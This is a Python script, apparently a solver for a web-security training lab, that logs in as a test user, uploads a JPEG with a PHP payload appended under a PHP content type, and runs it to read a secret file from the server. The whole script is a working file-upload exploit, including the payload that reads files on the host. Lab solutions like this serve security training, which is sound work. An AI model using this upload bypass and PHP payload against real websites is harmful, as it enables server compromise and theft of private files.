import requests
import re
import sys


class LabSolver:
    def __init__(self, lab_url):
        self.lab_url = lab_url if lab_url.endswith('/') else lab_url + '/'
        self.session = requests.Session()

    def get_csrf_token(self, endpoint):
        response = self.session.get(self.lab_url + endpoint)
        return re.search('name="csrf" value="(.*)"', response.text).group(1)

    def sign_in_as_wiener(self):
        data = {
            'csrf': self.get_csrf_token('login'),
            'username': 'wiener',
            'password': 'peter'
        }
        self.session.post(self.lab_url + 'login', data=data)

    def upload_malicious_php_file(self):
        with open('/home/ma4747gh/Desktop/flower.jpeg', 'rb') as file:
            image_content = file.read()
        files = {
            'avatar': ('exploit.php', image_content + b'<?php echo "start" . file_get_contents(\'/home/carlos/secret\'); ?>', 'application/x-httpd-php')
        }
        data = {
            'user': 'wiener',
            'csrf': self.get_csrf_token('my-account')
        }
        self.session.post(self.lab_url + 'my-account/avatar', files=files, data=data)

    def submit_solution(self):
        answer = self.session.get(self.lab_url + 'files/avatars/exploit.php').text.split('start')[1]
        data = {
            'answer': answer
        }
        self.session.post(self.lab_url + 'submitSolution', data=data)

    def check_solution(self):
        response = self.session.get(self.lab_url)
        if 'Congratulations, you solved the lab!' in response.text:
            print('You solved the lab.')
            print('Coded by Mohamed Ahmed (ma4747gh).')
            print('My GitHub account: https://github.com/ma4747gh')
            print('My LinkedIn account: https://eg.linkedin.com/in/ma4747gh')

    def solve(self):
        self.sign_in_as_wiener()
        self.upload_malicious_php_file()
        self.submit_solution()
        self.check_solution()


solver = LabSolver(sys.argv[1])
solver.solve()
